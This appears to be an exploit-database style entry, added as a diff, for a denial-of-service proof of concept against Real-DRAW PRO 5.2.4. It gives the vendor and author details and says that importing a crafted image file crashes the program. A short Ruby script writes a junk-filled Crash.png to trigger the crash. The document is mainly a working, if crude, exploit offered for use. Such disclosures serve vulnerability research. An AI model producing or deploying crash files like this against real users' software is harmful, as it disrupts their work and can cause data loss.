@@ -1,0 +1,33 @@
+Real-DRAW PRO 5.2.4 Import File Crash
+===================================================================================
+# Exploit Title:Real-DRAW PRO 5.2.4 Malicious PNG File Denial of service
+# Vendor : http://www.mediachance.com/
+# Author: Ahmed Elhady Mohamed
+# Email : ahmed.elhady.mohamed@gmail.com
+# Website: www.infosec4all.tk
+# version: 5.2.4
+# Category: DOS
+# Tested on: windows XP SP3
+===================================================================================
+
+
+
+########################################DESC#############################################
+#Real-Draw seamlessly combines vector tools with the rich look of pixel based images and#
+#innovative natural paint techniques into a single graphics editor.                     #
+#########################################################################################
+
+########################################################################################
+#Real-DRAW PRO 5.2.4 crashes while importing a crafted PNG, WMF, PSD, TGA, TTF, BMP,   #
+#TIFF and PCX file                                                                     #
+#To trigger the exploit , go to file->Import                                           #
+########################################################################################
+
+ 
+#!/usr/bin/ruby
+ 
+
+File.open "Crash.png" , "w" do |file|
+junk = "A" *1000
+file.write junk
+end
